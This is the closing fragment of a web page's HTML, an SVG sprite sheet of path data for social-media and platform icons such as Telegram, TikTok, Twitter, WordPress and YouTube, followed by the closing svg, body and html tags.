<path d="M12,2C6.477,2,2,6.477,2,12c0,5.523,4.477,10,10,10c5.523,0,10-4.477,10-10C22,6.477,17.523,2,12,2 M16.586,16.424 c-0.18,0.295-0.563,0.387-0.857,0.207c-2.348-1.435-5.304-1.76-8.785-0.964c-0.335,0.077-0.67-0.133-0.746-0.469 c-0.077-0.335,0.132-0.67,0.469-0.746c3.809-0.871,7.077-0.496,9.713,1.115C16.673,15.746,16.766,16.13,16.586,16.424 M17.81,13.7 c-0.226,0.367-0.706,0.482-1.072,0.257c-2.687-1.652-6.785-2.131-9.965-1.166C6.36,12.917,5.925,12.684,5.8,12.273 C5.675,11.86,5.908,11.425,6.32,11.3c3.632-1.102,8.147-0.568,11.234,1.328C17.92,12.854,18.035,13.335,17.81,13.7 M17.915,10.865 c-3.223-1.914-8.54-2.09-11.618-1.156C5.804,9.859,5.281,9.58,5.131,9.086C4.982,8.591,5.26,8.069,5.755,7.919 c3.532-1.072,9.404-0.865,13.115,1.338c0.445,0.264,0.59,0.838,0.327,1.282C18.933,10.983,18.359,11.129,17.915,10.865"/>
</symbol>
<symbol id="icon-stackoverflow" viewBox="0 0 24 24">
<path d="m 17.817128,20.228605 v -5.337217 h 1.771431 V 22 H 3.6 v -7.108612 h 1.771401 v 5.337217 z" />
<path d="m 7.3267845,14.385359 8.6959295,1.817316 0.368168,-1.748385 -8.6959318,-1.817319 z m 1.1503197,-4.140944 8.0517968,3.749872 0.73617,-1.610385 -8.0518344,-3.7728517 z m 2.2315078,-3.9569154 6.832405,5.6822664 1.12738,-1.357316 -6.832576,-5.6822636 z m 4.417,-4.2099019 -1.426448,1.0581864 5.291191,7.1316119 1.426412,-1.0582745 z M 7.1427296,18.434189 h 8.8799844 v -1.7713 H 7.1427296 Z" />
<path d="m 17.817128,20.228605 v -5.337217 h 1.771431 V 22 H 3.6 v -7.108612 h 1.771401 v 5.337217 z" />
<path d="m 7.3267845,14.385359 8.6959295,1.817316 0.368168,-1.748385 -8.6959318,-1.817319 z m 1.1503197,-4.140944 8.0517968,3.749872 0.73617,-1.610385 -8.0518344,-3.7728517 z m 2.2315078,-3.9569154 6.832405,5.6822664 1.12738,-1.357316 -6.832576,-5.6822636 z m 4.417,-4.2099019 -1.426448,1.0581864 5.291191,7.1316119 1.426412,-1.0582745 z M 7.1427296,18.434189 h 8.8799844 v -1.7713 H 7.1427296 Z" />
</symbol>
<symbol id="icon-stumbleupon" viewBox="0 0 24 24">
<path d="M12,4.294c-2.469,0-4.471,2.002-4.471,4.471v6.353c0,0.585-0.474,1.059-1.059,1.059c-0.585,0-1.059-0.474-1.059-1.059 v-2.824H2v2.941c0,2.469,2.002,4.471,4.471,4.471c2.469,0,4.471-2.002,4.471-4.471V8.765c0-0.585,0.474-1.059,1.059-1.059 s1.059,0.474,1.059,1.059v1.294l1.412,0.647l2-0.647V8.765C16.471,6.296,14.469,4.294,12,4.294z M13.059,12.353v2.882 c0,2.469,2.002,4.471,4.471,4.471S22,17.704,22,15.235v-2.824h-3.412v2.824c0,0.585-0.474,1.059-1.059,1.059 c-0.585,0-1.059-0.474-1.059-1.059v-2.882l-2,0.647L13.059,12.353z"/>
</symbol>
<symbol id="icon-telegram" viewBox="0 0 24 24">
<path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm3.08 14.757s-.25.625-.936.325l-2.541-1.949-1.63 1.486s-.127.096-.266.036c0 0-.12-.011-.27-.486-.15-.475-.911-2.972-.911-2.972L6 12.349s-.387-.137-.425-.438c-.037-.3.437-.462.437-.462l10.03-3.934s.824-.362.824.238l-1.786 9.004z"/>
</symbol>
<symbol id="icon-tiktok" viewBox="0 0 24 24">
<path d="M12.22 2H15.64C15.64 2 15.4502 6.39351 20.3898 6.70186V10.0981C20.3898 10.0981 17.7537 10.2636 15.64 8.64957L15.6769 15.6615C15.6769 16.9151 15.3052 18.1406 14.6087 19.1829C13.9123 20.2253 12.9224 21.0377 11.7642 21.5175C10.606 21.9972 9.33162 22.1228 8.10209 21.8782C6.87257 21.6337 5.74316 21.0301 4.85669 20.1437C3.97022 19.2573 3.3665 18.1279 3.12186 16.8984C2.87723 15.6689 3.00267 14.3945 3.48233 13.2363C3.96199 12.0781 4.77432 11.0881 5.8166 10.3916C6.85888 9.69502 8.0843 9.32318 9.33791 9.32307H10.2271V12.7231V12.7954C9.64757 12.6147 9.02578 12.6217 8.45043 12.8152C7.87508 13.0088 7.37556 13.3792 7.02314 13.8734C6.67071 14.3677 6.48338 14.9606 6.48786 15.5677C6.49235 16.1747 6.68842 16.7648 7.04811 17.2538C7.40781 17.7428 7.91274 18.1057 8.49089 18.2908C9.06903 18.4758 9.69086 18.4736 10.2676 18.2843C10.8444 18.0951 11.3467 17.7285 11.7029 17.2369C12.059 16.7454 12.2508 16.1538 12.2509 15.5468L12.22 2Z"/>
</symbol>
<symbol id="icon-tumblr" viewBox="0 0 24 24">
<path d="M16.749,17.396c-0.357,0.17-1.041,0.319-1.551,0.332c-1.539,0.041-1.837-1.081-1.85-1.896V9.847h3.861V6.937h-3.847V2.039 c0,0-2.77,0-2.817,0c-0.046,0-0.127,0.041-0.138,0.144c-0.165,1.499-0.867,4.13-3.783,5.181v2.484h1.945v6.282 c0,2.151,1.587,5.206,5.775,5.135c1.413-0.024,2.982-0.616,3.329-1.126L16.749,17.396z"/>
</symbol>
<symbol id="icon-twitch" viewBox="0 0 24 24">
<path d="M16.499,8.089h-1.636v4.91h1.636V8.089z M12,8.089h-1.637v4.91H12V8.089z M4.228,3.178L3,6.451v13.092h4.499V22h2.456 l2.454-2.456h3.681L21,14.636V3.178H4.228z M19.364,13.816l-2.864,2.865H12l-2.453,2.453V16.68H5.863V4.814h13.501V13.816z"/>
</symbol>
<symbol id="icon-twitter" viewBox="0 0 24 24">
<path d="M22.23,5.924c-0.736,0.326-1.527,0.547-2.357,0.646c0.847-0.508,1.498-1.312,1.804-2.27 c-0.793,0.47-1.671,0.812-2.606,0.996C18.324,4.498,17.257,4,16.077,4c-2.266,0-4.103,1.837-4.103,4.103 c0,0.322,0.036,0.635,0.106,0.935C8.67,8.867,5.647,7.234,3.623,4.751C3.27,5.357,3.067,6.062,3.067,6.814 c0,1.424,0.724,2.679,1.825,3.415c-0.673-0.021-1.305-0.206-1.859-0.513c0,0.017,0,0.034,0,0.052c0,1.988,1.414,3.647,3.292,4.023 c-0.344,0.094-0.707,0.144-1.081,0.144c-0.264,0-0.521-0.026-0.772-0.074c0.522,1.63,2.038,2.816,3.833,2.85 c-1.404,1.1-3.174,1.756-5.096,1.756c-0.331,0-0.658-0.019-0.979-0.057c1.816,1.164,3.973,1.843,6.29,1.843 c7.547,0,11.675-6.252,11.675-11.675c0-0.178-0.004-0.355-0.012-0.531C20.985,7.47,21.68,6.747,22.23,5.924z"/>
</symbol>
<symbol id="icon-vimeo" viewBox="0 0 24 24">
<path d="M22.396,7.164c-0.093,2.026-1.507,4.799-4.245,8.32C15.322,19.161,12.928,21,10.97,21c-1.214,0-2.24-1.119-3.079-3.359 c-0.56-2.053-1.119-4.106-1.68-6.159C5.588,9.243,4.921,8.122,4.206,8.122c-0.156,0-0.701,0.328-1.634,0.98L1.594,7.841 c1.027-0.902,2.04-1.805,3.037-2.708C6.001,3.95,7.03,3.327,7.715,3.264c1.619-0.156,2.616,0.951,2.99,3.321 c0.404,2.557,0.685,4.147,0.841,4.769c0.467,2.121,0.981,3.181,1.542,3.181c0.435,0,1.09-0.688,1.963-2.065 c0.871-1.376,1.338-2.422,1.401-3.142c0.125-1.187-0.343-1.782-1.401-1.782c-0.498,0-1.012,0.115-1.541,0.341 c1.023-3.35,2.977-4.977,5.862-4.884C21.511,3.066,22.52,4.453,22.396,7.164z"/>
</symbol>
<symbol id="icon-vk" viewBox="0 0 24 24">
<path d="M22,7.1c0.2,0.4-0.4,1.5-1.6,3.1c-0.2,0.2-0.4,0.5-0.7,0.9c-0.5,0.7-0.9,1.1-0.9,1.4c-0.1,0.3-0.1,0.6,0.1,0.8 c0.1,0.1,0.4,0.4,0.8,0.9h0l0,0c1,0.9,1.6,1.7,2,2.3c0,0,0,0.1,0.1,0.1c0,0.1,0,0.1,0.1,0.3c0,0.1,0,0.2,0,0.4 c0,0.1-0.1,0.2-0.3,0.3c-0.1,0.1-0.4,0.1-0.6,0.1l-2.7,0c-0.2,0-0.4,0-0.6-0.1c-0.2-0.1-0.4-0.1-0.5-0.2l-0.2-0.1 c-0.2-0.1-0.5-0.4-0.7-0.7s-0.5-0.6-0.7-0.8c-0.2-0.2-0.4-0.4-0.6-0.6C14.8,15,14.6,15,14.4,15c0,0,0,0-0.1,0c0,0-0.1,0.1-0.2,0.2 c-0.1,0.1-0.2,0.2-0.2,0.3c-0.1,0.1-0.1,0.3-0.2,0.5c-0.1,0.2-0.1,0.5-0.1,0.8c0,0.1,0,0.2,0,0.3c0,0.1-0.1,0.2-0.1,0.2l0,0.1 c-0.1,0.1-0.3,0.2-0.6,0.2h-1.2c-0.5,0-1,0-1.5-0.2c-0.5-0.1-1-0.3-1.4-0.6s-0.7-0.5-1.1-0.7s-0.6-0.4-0.7-0.6l-0.3-0.3 c-0.1-0.1-0.2-0.2-0.3-0.3s-0.4-0.5-0.7-0.9s-0.7-1-1.1-1.6c-0.4-0.6-0.8-1.3-1.3-2.2C2.9,9.4,2.5,8.5,2.1,7.5C2,7.4,2,7.3,2,7.2 c0-0.1,0-0.1,0-0.2l0-0.1c0.1-0.1,0.3-0.2,0.6-0.2l2.9,0c0.1,0,0.2,0,0.2,0.1S5.9,6.9,5.9,7L6,7c0.1,0.1,0.2,0.2,0.3,0.3 C6.4,7.7,6.5,8,6.7,8.4C6.9,8.8,7,9,7.1,9.2l0.2,0.3c0.2,0.4,0.4,0.8,0.6,1.1c0.2,0.3,0.4,0.5,0.5,0.7s0.3,0.3,0.4,0.4 c0.1,0.1,0.3,0.1,0.4,0.1c0.1,0,0.2,0,0.3-0.1c0,0,0,0,0.1-0.1c0,0,0.1-0.1,0.1-0.2c0.1-0.1,0.1-0.3,0.1-0.5c0-0.2,0.1-0.5,0.1-0.8 c0-0.4,0-0.8,0-1.3c0-0.3,0-0.5-0.1-0.8c0-0.2-0.1-0.4-0.1-0.5L9.6,7.6C9.4,7.3,9.1,7.2,8.7,7.1C8.6,7.1,8.6,7,8.7,6.9 C8.9,6.7,9,6.6,9.1,6.5c0.4-0.2,1.2-0.3,2.5-0.3c0.6,0,1,0.1,1.4,0.1c0.1,0,0.3,0.1,0.3,0.1c0.1,0.1,0.2,0.1,0.2,0.3 c0,0.1,0.1,0.2,0.1,0.3s0,0.3,0,0.5c0,0.2,0,0.4,0,0.6c0,0.2,0,0.4,0,0.7c0,0.3,0,0.6,0,0.9c0,0.1,0,0.2,0,0.4c0,0.2,0,0.4,0,0.5 c0,0.1,0,0.3,0,0.4s0.1,0.3,0.1,0.4c0.1,0.1,0.1,0.2,0.2,0.3c0.1,0,0.1,0,0.2,0c0.1,0,0.2,0,0.3-0.1c0.1-0.1,0.2-0.2,0.4-0.4 s0.3-0.4,0.5-0.7c0.2-0.3,0.5-0.7,0.7-1.1c0.4-0.7,0.8-1.5,1.1-2.3c0-0.1,0.1-0.1,0.1-0.2c0-0.1,0.1-0.1,0.1-0.1l0,0l0.1,0 c0,0,0,0,0.1,0s0.2,0,0.2,0l3,0c0.3,0,0.5,0,0.7,0S21.9,7,21.9,7L22,7.1z"/>
</symbol>
<symbol id="icon-whatsapp" viewBox="0 0 24 24">
<path d="M2.048,22l1.406-5.136c-0.867-1.503-1.324-3.208-1.323-4.955C2.133,6.446,6.579,2,12.042,2c2.651,0.001,5.14,1.033,7.011,2.906c1.871,1.873,2.901,4.363,2.9,7.011c-0.002,5.464-4.448,9.91-9.91,9.91c0,0,0,0,0,0h-0.004c-1.659-0.001-3.288-0.417-4.736-1.206L2.048,22z M7.545,18.828l0.301,0.179c1.265,0.751,2.714,1.148,4.193,1.148h0.003c4.54,0,8.235-3.695,8.237-8.237c0.001-2.201-0.855-4.271-2.41-5.828c-1.555-1.557-3.623-2.415-5.824-2.416c-4.544,0-8.239,3.695-8.241,8.237c-0.001,1.556,0.435,3.072,1.259,4.384l0.196,0.312l-0.832,3.04L7.545,18.828z M17.035,14.274c-0.062-0.103-0.227-0.165-0.475-0.289c-0.248-0.124-1.465-0.723-1.692-0.806c-0.227-0.083-0.392-0.124-0.557,0.124c-0.165,0.248-0.64,0.806-0.784,0.971c-0.144,0.165-0.289,0.186-0.536,0.062c-0.248-0.124-1.046-0.385-1.991-1.229c-0.736-0.657-1.233-1.468-1.378-1.715c-0.144-0.248-0.015-0.382,0.109-0.505c0.111-0.111,0.248-0.289,0.371-0.434c0.124-0.145,0.165-0.248,0.248-0.413c0.083-0.165,0.041-0.31-0.021-0.434c-0.062-0.124-0.557-1.343-0.763-1.839C9.364,7.284,9.159,7.35,9.007,7.342c-0.144-0.007-0.31-0.009-0.475-0.009c-0.165,0-0.433,0.062-0.66,0.31C7.646,7.891,7.006,8.49,7.006,9.709c0,1.219,0.887,2.396,1.011,2.562c0.124,0.165,1.746,2.666,4.23,3.739c0.591,0.255,1.052,0.408,1.412,0.522c0.593,0.189,1.133,0.162,1.56,0.098c0.476-0.071,1.465-0.599,1.671-1.177C17.096,14.873,17.096,14.378,17.035,14.274z"/>
</symbol>
<symbol id="icon-woocommerce" viewBox="0 0 24 24">
<path d="M19,2H5C3.3,2,2,3.3,2,5v11c0,1.7,1.3,3,3,3h4l6,3l-1-3h5c1.7,0,3-1.3,3-3V5C22,3.3,20.7,2,19,2z M17.4,6.5c-0.4,0.8-0.8,2.1-1,3.9c-0.3,1.8-0.4,3.1-0.3,4.1c0,0.3,0,0.5-0.1,0.7s-0.3,0.4-0.6,0.4s-0.6-0.1-0.9-0.4c-1-1-1.8-2.6-2.4-4.6c-0.7,1.4-1.2,2.4-1.6,3.1c-0.6,1.2-1.2,1.8-1.6,1.9c-0.3,0-0.5-0.2-0.8-0.7C7.6,13.5,7,10.7,6.4,6.7c0-0.3,0-0.5,0.2-0.7C6.7,5.8,7,5.7,7.3,5.6c0.5,0,0.9,0.2,0.9,0.8c0.3,2.3,0.7,4.2,1.1,5.7l2.4-4.5C11.9,7.2,12.1,7,12.5,7c0.5,0,0.8,0.3,0.9,0.9c0.3,1.4,0.6,2.6,1,3.7c0.3-2.7,0.8-4.7,1.4-5.9c0.2-0.3,0.4-0.5,0.7-0.5c0.2,0,0.5,0.1,0.7,0.2c0.2,0.2,0.3,0.4,0.3,0.6S17.5,6.4,17.4,6.5z"/>
</symbol>
<symbol id="icon-wordpress" viewBox="0 0 24 24">
<path d="M12.158,12.786L9.46,20.625c0.806,0.237,1.657,0.366,2.54,0.366c1.047,0,2.051-0.181,2.986-0.51 c-0.024-0.038-0.046-0.079-0.065-0.124L12.158,12.786z M3.009,12c0,3.559,2.068,6.634,5.067,8.092L3.788,8.341 C3.289,9.459,3.009,10.696,3.009,12z M18.069,11.546c0-1.112-0.399-1.881-0.741-2.48c-0.456-0.741-0.883-1.368-0.883-2.109 c0-0.826,0.627-1.596,1.51-1.596c0.04,0,0.078,0.005,0.116,0.007C16.472,3.904,14.34,3.009,12,3.009 c-3.141,0-5.904,1.612-7.512,4.052c0.211,0.007,0.41,0.011,0.579,0.011c0.94,0,2.396-0.114,2.396-0.114 C7.947,6.93,8.004,7.642,7.52,7.699c0,0-0.487,0.057-1.029,0.085l3.274,9.739l1.968-5.901l-1.401-3.838 C9.848,7.756,9.389,7.699,9.389,7.699C8.904,7.67,8.961,6.93,9.446,6.958c0,0,1.484,0.114,2.368,0.114 c0.94,0,2.397-0.114,2.397-0.114c0.485-0.028,0.542,0.684,0.057,0.741c0,0-0.488,0.057-1.029,0.085l3.249,9.665l0.897-2.996 C17.841,13.284,18.069,12.316,18.069,11.546z M19.889,7.686c0.039,0.286,0.06,0.593,0.06,0.924c0,0.912-0.171,1.938-0.684,3.22 l-2.746,7.94c2.673-1.558,4.47-4.454,4.47-7.771C20.991,10.436,20.591,8.967,19.889,7.686z M12,22C6.486,22,2,17.514,2,12 C2,6.486,6.486,2,12,2c5.514,0,10,4.486,10,10C22,17.514,17.514,22,12,22z"/>
</symbol>
<symbol id="icon-yelp" viewBox="0 0 24 24">
<path d="M12.271,16.718v1.417q-.011,3.257-.067,3.4a.707.707,0,0,1-.569.446,4.637,4.637,0,0,1-2.024-.424A4.609,4.609,0,0,1,7.8,20.565a.844.844,0,0,1-.19-.4.692.692,0,0,1,.044-.29,3.181,3.181,0,0,1,.379-.524q.335-.412,2.019-2.409.011,0,.669-.781a.757.757,0,0,1,.44-.274.965.965,0,0,1,.552.039.945.945,0,0,1,.418.324.732.732,0,0,1,.139.468Zm-1.662-2.8a.783.783,0,0,1-.58.781l-1.339.435q-3.067.981-3.257.981a.711.711,0,0,1-.6-.4,2.636,2.636,0,0,1-.19-.836,9.134,9.134,0,0,1,.011-1.857,3.559,3.559,0,0,1,.335-1.389.659.659,0,0,1,.625-.357,22.629,22.629,0,0,1,2.253.859q.781.324,1.283.524l.937.379a.771.771,0,0,1,.4.34A.982.982,0,0,1,10.609,13.917Zm9.213,3.313a4.467,4.467,0,0,1-1.021,1.8,4.559,4.559,0,0,1-1.512,1.417.671.671,0,0,1-.7-.078q-.156-.112-2.052-3.2l-.524-.859a.761.761,0,0,1-.128-.513.957.957,0,0,1,.217-.513.774.774,0,0,1,.926-.29q.011.011,1.327.446,2.264.736,2.7.887a2.082,2.082,0,0,1,.524.229.673.673,0,0,1,.245.68Zm-7.5-7.049q.056,1.137-.6,1.361-.647.19-1.272-.792L6.237,4.08a.7.7,0,0,1,.212-.691,5.788,5.788,0,0,1,2.314-1,5.928,5.928,0,0,1,2.5-.352.681.681,0,0,1,.547.5q.034.2.245,3.407T12.327,10.181Zm7.384,1.2a.679.679,0,0,1-.29.658q-.167.112-3.67.959-.747.167-1.015.257l.011-.022a.769.769,0,0,1-.513-.044.914.914,0,0,1-.413-.357.786.786,0,0,1,0-.971q.011-.011.836-1.137,1.394-1.908,1.673-2.275a2.423,2.423,0,0,1,.379-.435A.7.7,0,0,1,17.435,8a4.482,4.482,0,0,1,1.372,1.489,4.81,4.81,0,0,1,.9,1.868v.034Z"/>
</symbol>
<symbol id="icon-xanga" viewBox="0 0 24 24">
<path d="M9,9h6v6H9V9z M3,9h6V3H3V9z M15,9h6V3h-6V9z M15,21h6v-6h-6V21z M3,21h6v-6H3V21z"/>
</symbol>
<symbol id="icon-youtube" viewBox="0 0 24 24">
<path d="M21.8,8.001c0,0-0.195-1.378-0.795-1.985c-0.76-0.797-1.613-0.801-2.004-0.847c-2.799-0.202-6.997-0.202-6.997-0.202 h-0.009c0,0-4.198,0-6.997,0.202C4.608,5.216,3.756,5.22,2.995,6.016C2.395,6.623,2.2,8.001,2.2,8.001S2,9.62,2,11.238v1.517 c0,1.618,0.2,3.237,0.2,3.237s0.195,1.378,0.795,1.985c0.761,0.797,1.76,0.771,2.205,0.855c1.6,0.153,6.8,0.201,6.8,0.201 s4.203-0.006,7.001-0.209c0.391-0.047,1.243-0.051,2.004-0.847c0.6-0.607,0.795-1.985,0.795-1.985s0.2-1.618,0.2-3.237v-1.517 C22,9.62,21.8,8.001,21.8,8.001z M9.935,14.594l-0.001-5.62l5.404,2.82L9.935,14.594z"/>
</symbol>
</defs>
</svg>

</body>
</html>
